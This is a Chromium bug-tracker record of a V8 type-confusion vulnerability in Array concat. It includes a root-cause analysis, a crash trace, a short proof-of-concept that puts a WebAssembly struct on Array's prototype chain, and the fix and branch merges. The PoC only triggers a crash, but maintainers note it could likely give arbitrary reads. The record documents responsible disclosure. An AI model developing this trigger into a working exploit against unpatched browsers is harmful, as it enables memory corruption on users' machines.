# Type Confusion between WasmObject and JSObject in Array Concat

| Field | Value |
|-------|-------|
| **Issue ID** | [338908243](https://issues.chromium.org/issues/338908243) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime, Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows |
| **Reporter** | ki...@gmail.com |
| **Assignee** | ml...@chromium.org |
| **Created** | 2024-05-06 |
| **Bounty** | $10,000.00 |

## Description

# Steps to reproduce the problem

1. Download debug v8 from: gs://v8-asan/linux-debug/d8-linux-debug-v8-component-93712.zip
2. Run: `./d8 poc.js`

```
$ cd /path/to/v8/
$ /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc.js

#
# Fatal error in gen/torque-generated/src/objects/js-objects-tq-inl.inc, line 67
# Check failed: !v8::internal::v8_flags.enable_slow_asserts.value() || (IsJSObject_NonInline(*this)).
#
#
#
#FailureMessage Object: 0x7ffd386ecee0
==== C stack trace ===============================

    /tmp/d8-linux-debug-v8-component-93712/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7ff68426fd83]
    /tmp/d8-linux-debug-v8-component-93712/libv8_libplatform.so(+0x18e0d) [0x7ff684218e0d]
    /tmp/d8-linux-debug-v8-component-93712/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x17d) [0x7ff684250f7d]
    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x25721f2) [0x7ff6813721f2]
    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x2660ffc) [0x7ff681460ffc]
    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x26589d3) [0x7ff6814589d3]
    /tmp/d8-linux-debug-v8-component-93712/libv8.so(v8::internal::Builtin_ArrayConcat(int, unsigned long*, v8::internal::Isolate*)+0x7d) [0x7ff68145800d]
    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x1d7bb7d) [0x7ff680b7bb7d]
[1]    1575121 trace trap  /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc2.js

```
# Problem Description

## Root Cause Analysis

JSReceiver::SetPrototype only checks if object is a WasmObject, not if value is a WasmObject, so we can register a WasmObject as Prototype for it.

```
Maybe<bool> JSReceiver::SetPrototype(Isolate* isolate,
                                     Handle<JSReceiver> object,
                                     Handle<Object> value, bool from_javascript,
                                     ShouldThrow should_throw) {
  if (IsWasmObject(*object)) {
    RETURN_FAILURE(isolate, should_throw,
                   NewTypeError(MessageTemplate::kWasmObjectsAreOpaque));
  }

  if (IsJSProxy(*object)) {
    return JSProxy::SetPrototype(isolate, Handle<JSProxy>::cast(object), value,
                                 from_javascript, should_throw);
  }
  return JSObject::SetPrototype(isolate, Handle<JSObject>::cast(object), value,
                                from_javascript, should_throw);
}

```

But some call sites of PrototypeIterator::GetCurrent function don't notice this, it will directly cast the prototype to T type object when it traverses the prototype. At this time [1] in Array Concat implementation, if caller use `iter.GetCurrent<JSObject>()` , it will cast the prototype of type `WasmObject` directly to `JSObject` , but the two are inconsistent, which will lead to type confusion and trigger DCHECK.

```
inline bool HasOnlySimpleElements(Isolate* isolate,
                                  Tagged<JSReceiver> receiver) {
  DisallowGarbageCollection no_gc;
  PrototypeIterator iter(isolate, receiver, kStartAtReceiver);
  for (; !iter.IsAtEnd(); iter.Advance()) {
    if (IsJSProxy(iter.GetCurrent())) return false;
    Tagged<JSObject> current = iter.GetCurrent<JSObject>(); // <---- [1]
    if (!HasSimpleElements(current)) return false;
  }
  return true;
}

```

This vulnerability allows an arbitrary Wasm Object to be confused with a JSObject. And most of the data fields in Wasm object (especially in WasmStruct) are controllable.

# Summary

Type Confusion between WasmObject and JSObject in Array Concat

# Custom Questions

#### Type of crash:

tab

#### Reporter credit:

Zhenghang Xiao (@Kipreyyy)

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 71.0 KB)
- [repro-issue.js](attachments/repro-issue.js) (text/javascript, 744 B)

## Timeline

### ch...@chromium.org (2024-05-06)

Thanks for the report.

Is it possible to provide a more minimized POC?

### ch...@chromium.org (2024-05-06)

Setting labels provisionally

### ch...@chromium.org (2024-05-06)

(To v8 sheriff. I did not run Clusterfuzz because the POC looked complicated.)

### ki...@gmail.com (2024-05-07)

re #c4:
- minimize poc

'test/mjsunit/wasm/wasm-module-builder.js' ie here: 
https://source.chromium.org/chromium/chromium/src/+/main:v8/test/mjsunit/wasm/wasm-module-builder.js;l=1?q=test%2Fmjsunit%2Fwasm%2Fwasm-module-builder.js&sq=

```
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

function CreateWasmObjects() {
  let builder = new WasmModuleBuilder();
  let struct_type = builder.addStruct([makeField(kWasmI32, true)]);
  builder.addFunction('MakeStruct', makeSig([], [kWasmExternRef])).exportFunc().addBody([kExprI32Const, 42, kGCPrefix, kExprStructNew, struct_type, kGCPrefix, kExprExternConvertAny]);
  let instance = builder.instantiate();
  return instance.exports.MakeStruct();
}
let struct = CreateWasmObjects();
Array.prototype.__proto__ = struct;
print([1].concat());
```

### ki...@gmail.com (2024-05-07)

The original poc is for your convenience, test/mjsunit/wasm/wasm-module-builder.js and poc are merged into one file.
The original poc is simple.
So it should be able to be uploaded to clusterfuzz.

### pe...@google.com (2024-05-07)

Thank you for providing more feedback. Adding the requester to the CC list.

### cl...@appspot.gserviceaccount.com (2024-05-07)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6229421217218560.

### ch...@chromium.org (2024-05-07)

Thank you for that clarification. I've uploaded it to CF with the contents of wasm-module-builder.js at HEAD.

### 24...@project.gserviceaccount.com (2024-05-07)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2024-05-07)

Detailed Report: https://clusterfuzz.com/testcase?key=6229421217218560

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  !v8::internal::v8_flags.enable_slow_asserts.value() || (IsJSObject_NonInline(*th
  v8::internal::Tagged<v8::internal::JSObject> v8::internal::PrototypeIterator::Ge
  v8::internal::Slow_ArrayConcat
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=89971:89972

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6229421217218560

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### pe...@google.com (2024-05-07)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-05-07)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### sa...@google.com (2024-05-08)

Clusterfuzz bisects this to <https://chromium.googlesource.com/v8/v8/+/50f8643de79d1c0db4efb41c24ed7c283a97bb7b> "[wasm-gc] Ship it!". Jakob or Matthias, could one of you take a look? Also happy to run another bisect with (I guess) --experimental-wasm-gc to bisect further back if that'd be helpful. Let me know!

### ki...@gmail.com (2024-05-08)

Bringing the gc flag will continue to be divided to a position changed by wasm encoding. I don't think bisect is more meaningful.

### ml...@chromium.org (2024-05-08)

I don't think further bisects will help much, it probably all boils down to the change removing the artificial wrapper that wasm structs and arrays were wrapped in initially: <https://chromium-review.googlesource.com/c/v8/v8/+/3912763>

My initial thought is that we'd probably need to replace the `IsJSProxy()` with `!IsJSObject()` here: <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-array.cc;l=54>

If that's a proper fix, we'll probably need to revisit some more of these in the prototype chain handling, <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/map.cc;l=1186> does a similar assumption as well as <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/strings/string-stream.cc;l=437>.

I'm not sure if it is possible to end up with a wasm object there, though.

Samuel, would it help if we had a `%WasmStruct()` and `%WasmArray()` for the JS fuzzers to have a better chance of finding such cases?

(I'm not sure if that would be completely trivial, as generally a wasm module is needed as there are only user-defined wasm array and struct types.)

### ml...@chromium.org (2024-05-10)

Fix in review: <https://chromium-review.googlesource.com/c/v8/v8/+/5529235>

Attached is the minified mjsunit reproducer test case.

### ap...@google.com (2024-05-10)

Project: v8/v8
Branch: main

commit cc05792346fb017eaa961ee7d35cf1f9bb53bb0a
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Fri May 10 10:38:29 2024

    [builtins] HasOnlySimpleElements is false for non-JSObjects
    
    Bug: 338908243
    Change-Id: I91139167fb186d56db1695a05e0173069c6c195b
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5529235
    Auto-Submit: Matthias Liedtke <mliedtke@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#93820}

M       src/builtins/builtins-array.cc

https://chromium-review.googlesource.com/5529235


### ml...@chromium.org (2024-05-10)

I am not very familiar with the code path in question here but in general having a `WasmStruct` or a `WasmArray` interpreted as a `JSObject` should in most cases allow to have at least arbitrary reads.
Citing the initial report in [comment#1](https://issues.chromium.org/issues/338908243#comment1):

> This vulnerability allows an arbitrary Wasm Object to be confused with a JSObject. And most of the data fields in Wasm object (especially in WasmStruct) are controllable.

I don't know if this type confusion can be used to perform arbitrary writes, so the safest bet would be to patch it to all revisions we get an approval on as the fix is rather trivial and doesn't have high risks.

### 24...@project.gserviceaccount.com (2024-05-11)

ClusterFuzz testcase 6229421217218560 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=93819:93820

If this is incorrect, please add the hotlistid:5432646 and re-open the issue.

### pe...@google.com (2024-05-11)

Merge review required: M125 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

### pe...@google.com (2024-05-11)

Merge review required: M124 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), obenedict (ChromeOS), danielyip (Desktop)

### pe...@google.com (2024-05-13)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=338908243&entry.958145677=Android, Fuchsia, Linux, Mac, Windows, Lacros&entry.763880440=Extended&entry.1678852700=High&entry.763402679=Blink>JavaScript>Runtime, Blink>JavaScript>WebAssembly&entry.975983575=mliedtke@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

### ml...@chromium.org (2024-05-14)

Answers for both 124 and 125:

1. This is a fix for a type confusion that could potentially cause memory corruption.
2. <https://chromium-review.googlesource.com/c/v8/v8/+/5529235>
3. Yes, <https://chromiumdash.appspot.com/commit/cc05792346fb017eaa961ee7d35cf1f9bb53bb0a>
4. No.
5. --
6. No.

### sp...@google.com (2024-05-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
$10,000 for this high quality report of memory corruption in the renderer / sandboxed process -- nice work!

Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. Two other things we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.
* If you are already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have already registered, there is no need to repeat the process and you’ll automatically be paid soon. If you have any payment related questions or issues, please reach out to p2p-vrp@google.com.

### am...@chromium.org (2024-05-16)

M125 and M125 backmerge approved for <https://crrev.com/c/5529235>
please merge this fix to 12.5 and 12.4 at soonest (by 10am PT tomorrow) so this fix can be included in the next updates of M125 Stable and M124 Extended Stable

### ap...@google.com (2024-05-16)

Project: v8/v8
Branch: refs/branch-heads/12.5

commit b77915f9eac137650051b149afaae1c6adb62fcb
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Fri May 10 10:38:29 2024

    Merged: [builtins] HasOnlySimpleElements is false for non-JSObjects
    
    Bug: 338908243
    (cherry picked from commit cc05792346fb017eaa961ee7d35cf1f9bb53bb0a)
    
    Change-Id: I698ac073ca2c05ec2174058a9601acd7b5e9a61c
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5545378
    Auto-Submit: Matthias Liedtke <mliedtke@chromium.org>
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.5@{#16}
    Cr-Branched-From: 15b9756484d5bda98ba273ae13f8db58200db4db-refs/heads/12.5.227@{#1}
    Cr-Branched-From: 497d8573dc80b1b69052a834bec894cf5d4238e7-refs/heads/main@{#93350}

M       src/builtins/builtins-array.cc

https://chromium-review.googlesource.com/5545378


### ap...@google.com (2024-05-16)

Project: v8/v8
Branch: refs/branch-heads/12.4

commit e7b64c6ee185693ff1e45f0d7af1850d7f439fb7
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Fri May 10 10:38:29 2024

    Merged: [builtins] HasOnlySimpleElements is false for non-JSObjects
    
    Bug: 338908243
    (cherry picked from commit cc05792346fb017eaa961ee7d35cf1f9bb53bb0a)
    
    Change-Id: I9b5c2333924a54169ea3fa48e67e7db2ec67f6b9
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5545380
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Auto-Submit: Matthias Liedtke <mliedtke@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.4@{#34}
    Cr-Branched-From: 309640da62fae0485c7e4f64829627c92d53b35d-refs/heads/12.4.254@{#1}
    Cr-Branched-From: 5dc24701432278556a9829d27c532f974643e6df-refs/heads/main@{#92862}

M       src/builtins/builtins-array.cc

https://chromium-review.googlesource.com/5545380


### pe...@google.com (2024-05-20)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### rz...@google.com (2024-05-28)

Automation isn't adding the questionnaire for the LTS merge request, but I'm already adding the answers:

1. <https://crrev.com/c/5573891>
2. Low, no conflicts
3. 124, 125
4. Yes

### ap...@google.com (2024-05-29)

Project: v8/v8
Branch: refs/branch-heads/12.0

commit 73c61498670a43d1189877416366314c7a13ef73
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Fri May 10 10:38:29 2024

    [M120-LTS][builtins] HasOnlySimpleElements is false for non-JSObjects
    
    (cherry picked from commit cc05792346fb017eaa961ee7d35cf1f9bb53bb0a)
    
    Bug: b/338908243
    Change-Id: I91139167fb186d56db1695a05e0173069c6c195b
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5529235
    Auto-Submit: Matthias Liedtke <mliedtke@chromium.org>
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#93820}
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5573891
    Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Reviewed-by: Artem Sumaneev <asumaneev@google.com>
    Cr-Commit-Position: refs/branch-heads/12.0@{#58}
    Cr-Branched-From: ed7b4caf1fb8184ad9e24346c84424055d4d430a-refs/heads/12.0.267@{#1}
    Cr-Branched-From: 210e75b19db4352c9b78dce0bae11c2dc3077df4-refs/heads/main@{#90651}

M       src/builtins/builtins-array.cc

https://chromium-review.googlesource.com/5573891


### pe...@google.com (2024-08-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/338908243)*
